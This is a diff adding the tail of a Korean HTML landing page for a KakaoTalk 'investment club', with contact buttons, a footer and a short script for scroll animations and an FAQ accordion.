+            <h2>우리의 전략을 배울 준비가 되셨나요?</h2>
+            <p>지금 문의하여 맞춤형 통찰력을 얻고 상거래 성공을 위한 여정을 시작해 보세요.</p>
+            <button class="cta-btn" onclick="k2()"><i class="fa-solid fa-users"></i> 카카오톡으로 문의하기</button>
+        </section>
+
+        <footer class="footer">
+            © 2026 kakaotalk 투자 클럽 · 전인구
+        </footer>
+
+        <!-- 하단 고정 버튼 -->
+        <div class="float-bar">
+            <button class="float-btn" onclick="k2()"><i class="fa-solid fa-users"></i> 카카오톡으로 문의하기</button>
+        </div>
+
+    </div>
+
+    <script>
+        var ro = new IntersectionObserver(function(e) {
+            e.forEach(function(en) {
+                if (en.isIntersecting) {
+                    en.target.classList.add('on');
+                    ro.unobserve(en.target);
+                }
+            });
+        }, { threshold: 0.1, rootMargin: '0px 0px -16px 0px' });
+        document.querySelectorAll('.reveal').forEach(function(el) { ro.observe(el); });
+
+        function toggleFaq(q) {
+            var p = q.closest('.faq-item');
+            var was = p.classList.contains('open');
+            document.querySelectorAll('.faq-item').forEach(function(i) { i.classList.remove('open'); });
+            if (!was) p.classList.add('open');
+        }
+    </script>
+
+</body>
+</html>
